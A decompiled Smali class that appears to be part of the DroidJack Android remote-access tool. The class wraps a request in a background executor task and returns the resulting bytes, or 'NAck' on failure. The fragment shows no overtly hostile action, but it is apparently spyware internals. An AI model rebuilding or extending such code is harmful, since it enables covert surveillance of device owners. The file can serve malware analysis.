.class public Lnet/droidjack/server/ca;
.super Ljava/lang/Object;


# instance fields
.field private a:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lnet/droidjack/server/ca;->a:Landroid/content/Context;

    invoke-static {}, Lnet/droidjack/server/ae;->a()V

    return-void
.end method

.method static synthetic a(Lnet/droidjack/server/ca;)Landroid/content/Context;
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/ca;->a:Landroid/content/Context;

    return-object v0
.end method


# virtual methods
.method protected a(Ljava/lang/String;)[B
    .locals 2

    :try_start_0
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    new-instance v1, Lnet/droidjack/server/cb;

    invoke-direct {v1, p0, p1}, Lnet/droidjack/server/cb;-><init>(Lnet/droidjack/server/ca;Ljava/lang/String;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/concurrent/Future;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_0
.end method
